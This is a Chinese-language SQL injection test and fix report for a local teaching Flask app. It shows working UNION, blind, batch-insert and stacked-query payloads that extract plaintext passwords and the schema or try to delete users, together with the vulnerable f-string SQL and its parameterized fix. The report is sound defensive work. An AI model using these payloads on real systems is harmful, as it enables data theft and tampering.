# Flask 用户管理系统 — DAY3 SQL注入漏洞测试与修复报告

---

## 文档信息

| 项目 | 内容 |
|------|------|
| **项目名称** | Flask 用户管理系统 (flask登录) |
| **报告日期** | 2026-07-08 |
| **测试范围** | SQL 注入漏洞专项检测 |
| **测试接口** | `/register`、`/search`、`/` |
| **修复文件数** | 1 个文件 (`app.py`) |
| **威胁等级** | 🔴 **高危** (High) |

---

## 一、漏洞总览

| 编号 | 漏洞名称 | 接口 | 成因 | 严重级别 | 利用难度 |
|------|----------|------|------|----------|----------|
| SQL-1 | 搜索接口 UNION 注入 | `/search`、`/` | f-string 拼接 LIKE 查询 | 🔴 高危 | ⭐ 极低 |
| SQL-2 | 注册接口 INSERT 注入 | `/register` | f-string 拼接 INSERT 语句 | 🔴 高危 | ⭐ 极低 |

**漏洞根因**：上一轮新增的注册和搜索功能中，为教学演示目的使用了 f-string 字符串拼接构建 SQL 语句，未对用户输入做任何过滤或转义，导致攻击者可直接注入任意 SQL 代码。

---

## 二、漏洞详情与攻击验证

### SQL-1 | 搜索接口 UNION 注入 — `/search`、`/`

**漏洞代码** (`app.py:206-208`, `app.py:308-310`)：

```python
sql = f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
cursor.execute(sql)
```

#### 攻击载荷 1：注入点探测

```
GET /search?keyword=admin'
```

**结果**：服务器返回 `500 Internal Server Error`，确认单引号破坏了 SQL 语法结构，注入点存在。

#### 攻击载荷 2：UNION 联合查询 — 提取所有用户密码

```
GET /search?keyword=' UNION SELECT id,username,'x',password,phone FROM users --
```

**等价 SQL**：
```sql
SELECT * FROM users
WHERE username LIKE '%' UNION SELECT id,username,'x',password,phone FROM users --%'
OR email LIKE '%...%'
```

**实际返回**：

| ID | 用户名 | 邮箱（实际为密码） | 手机 |
|----|--------|-------------------|------|
| 1 | admin | **admin123** | 13800138000 |
| 2 | alice | **alice2025** | 13900139001 |
| 3 | testuser | **test123** | 13700137000 |
| 8 | sqlitest | **test123** | 13800 |
| 9 | normaluser1 | **test123** | 12345678901 |

✅ **所有用户明文密码被成功提取。**

#### 攻击载荷 3：UNION 联合查询 — 提取数据库结构

```
GET /search?keyword=' UNION SELECT 1,type,name,sql,5 FROM sqlite_master --
```

**结果**：成功获取 `sqlite_master` 系统表内容，包括：
- `CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT, email TEXT, phone TEXT)`
- `CREATE TABLE sqlite_sequence(name,seq)`
- 自动生成的唯一索引信息

✅ **数据库完整 Schema 被成功提取。**

#### 攻击载荷 4：布尔盲注

```
GET /search?keyword=admin' AND '1'='1    → 有结果返回（恒真条件）
GET /search?keyword=admin' AND '1'='2    → 无结果返回（恒假条件）
```

✅ **布尔盲注可用，可逐字符猜解数据。**

#### 攻击载荷 5：首页同路径注入

```
GET /?keyword=' UNION SELECT 1,2,3,4,5 --
```

✅ **首页搜索同样存在注入，返回注入列值 `1 | 2 | 4 | 5`。**

---

### SQL-2 | 注册接口 INSERT 注入 — `/register`

**漏洞代码** (`app.py:287-289`)：

```python
sql = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"
cursor.execute(sql)
```

#### 攻击载荷 1：批量插入

注入点在 `password` 字段：

```
POST /register
username=hacker1
password=hack123', 'h1@x.com', '111'), ('hacker2', 'hack456', 'h2@x.com', '999')--
email=unused@x.com
phone=000
```

**等价 SQL**：
```sql
INSERT INTO users (username, password, email, phone) VALUES
('hacker1', 'hack123', 'h1@x.com', '111'),
('hacker2', 'hack456', 'h2@x.com', '999')
--', 'unused@x.com', '000')
```

**结果**：一次请求成功创建了 2 个用户 (`hacker1`、`hacker2`)，后续搜索验证确认两个用户均存在于数据库中。

✅ **批量用户创建成功，可绕过注册限制。**

#### 攻击载荷 2：Stacked Query 尝试

```
POST /register
password=test') ; DELETE FROM users WHERE username='testuser' ; --
```

**结果**：`500 Internal Server Error`。Python `sqlite3.execute()` 不支持多语句执行，stacked query 被阻止。**但不影响其他注入方式的危害。**

---

## 三、漏洞影响评估

| 影响维度 | 风险等级 | 说明 |
|----------|----------|------|
| **数据机密性** | 🔴 高危 | 攻击者可读取全部用户数据，包括密码、邮箱、手机号 |
| **数据完整性** | 🟠 中危 | 攻击者可批量创建恶意用户（但无法通过登录系统认证，因登录使用独立的内存字典） |
| **数据可用性** | 🟢 低危 | Stacked query 被阻止，无法直接 DELETE/DROP |
| **系统暴露** | 🔴 高危 | 攻击者可获取数据库完整 Schema，为进一步攻击提供信息 |
| **利用门槛** | 🔴 极低 | 仅需浏览器或 curl，无需任何认证即可发起攻击 |

---

## 四、修复方案

### 修复原则

将**字符串拼接构建 SQL** → **参数化查询（Parameterized Query）**

使用 `?` 占位符 + 参数元组传参，由数据库驱动对参数值进行正确的转义和类型处理，从根源消除 SQL 注入。

### 修复点 1：`/` 路由 — 搜索功能 (app.py:206-209)

```python
# ===== 修复前 =====
sql = f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
logging.info(f"[SEARCH SQL] {sql}")
cursor.execute(sql)

# ===== 修复后 =====
like_pattern = f"%{keyword}%"
sql = "SELECT * FROM users WHERE username LIKE ? OR email LIKE ?"
logging.info(f"[SEARCH SQL] {sql} | keyword={keyword}")
cursor.execute(sql, (like_pattern, like_pattern))
```

### 修复点 2：`/register` 路由 — 注册功能 (app.py:288-290)

```python
# ===== 修复前 =====
sql = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"
logging.info(f"[REGISTER SQL] {sql}")
cursor.execute(sql)

# ===== 修复后 =====
sql = "INSERT INTO users (username, password, email, phone) VALUES (?, ?, ?, ?)"
logging.info(f"[REGISTER SQL] {sql} | username={username}")
cursor.execute(sql, (username, password, email, phone))
```

### 修复点 3：`/search` 路由 — 独立搜索 (app.py:309-312)

与修复点 1 完全相同的改动。

### 为什么参数化查询可以防御？

参数化查询将 **SQL 逻辑** 与 **数据** 严格分离：

| 场景 | 输入 | f-string 拼接行为 | 参数化查询行为 |
|------|------|-------------------|----------------|
| 正常搜索 | `admin` | `WHERE ... LIKE '%admin%'` ✅ | `WHERE ... LIKE ?` → `'%admin%'` ✅ |
| 注入攻击 | `' UNION SELECT ...` | `WHERE ... LIKE '%' UNION SELECT ... %'` 🔴 **代码执行** | `WHERE ... LIKE ?` → 搜索字面字符串 `%' UNION SELECT ...%'` ✅ |

攻击者输入中的单引号、`UNION`、`--` 等 SQL 关键字符在参数化查询中被当作**普通字符串数据**处理，不再具备 SQL 语法意义。

---

## 五、修复验证

### 验证环境

- **URL**: `http://127.0.0.1:5000`
- **认证状态**: 已登录 (admin)
- **验证日期**: 2026-07-08

### 验证结果

| 编号 | 测试项 | 测试 Payload | 修复前 | 修复后 |
|------|--------|-------------|--------|--------|
| V1 | 单引号探测 | `?keyword=admin'` | ❌ 500 错误 | ✅ 200 正常 |
| V2 | UNION 注入 | `?keyword=' UNION SELECT 1,2,3,4,5 --` | ❌ 返回注入数据 | ✅ 无结果（payload 被当作字面字符串） |
| V3 | 密码提取 | `?keyword=' UNION SELECT id,username,'x',password,phone FROM users --` | ❌ 全部密码泄露 | ✅ 无结果 |
| V4 | Schema 提取 | `?keyword=' UNION SELECT ... FROM sqlite_master --` | ❌ 数据库结构泄露 | ✅ 无结果 |
| V5 | 首页注入 | `/?keyword=' UNION SELECT 1,2,3,4,5 --` | ❌ 注入成功 | ✅ 无结果 |
| V6 | 注册批量插入 | password=`hack'),(...)--` | ❌ 批量创建用户 | ✅ 注入字符安全入库，不破坏 SQL |
| V7 | 正常搜索 | `?keyword=admin` | ✅ 正常 | ✅ 正常 |
| V8 | 正常注册 | 普通表单提交 | ✅ 正常 | ✅ 正常 |

### 验证结论

> ✅ **2 项 SQL 注入漏洞全部修复成功，正常的搜索和注册功能不受影响。**

---

## 六、修复总结

| 维度 | 详情 |
|------|------|
| **修复漏洞数** | 2 个（SQL-1 搜索注入、SQL-2 注册注入） |
| **影响接口数** | 3 个（`/`、`/search`、`/register`） |
| **修改文件数** | 1 个（`app.py`） |
| **修改行数** | 9 行（3 处 SQL 执行点，每处 3 行） |
| **修复方式** | f-string 拼接 → `?` 占位符参数化查询 |
| **新增依赖** | 无 |
| **功能回归** | 全部通过 |

---

## 七、安全建议

1. **代码审查规范**：禁止在任何 SQL 语句中使用 f-string / `%` 格式化 / `.format()` 拼接用户输入，强制使用参数化查询。
2. **静态分析**：引入 Bandit 或 SQLFluff 等工具，在 CI/CD 中自动检测字符串拼接的 SQL 语句。
3. **最小权限原则**：数据库连接使用受限账户（仅授予 SELECT、INSERT 权限），即使发生注入也能限制影响范围。
4. **密码存储**：SQLite 数据库中的密码目前仍为明文存储，建议与内存字典一致，使用 bcrypt 哈希存储。
5. **登录统一**：当前登录认证使用内存 `USERS` 字典，注册写入 SQLite，两者数据源不一致。建议统一使用同一数据源。

---

*报告生成时间：2026年7月8日*
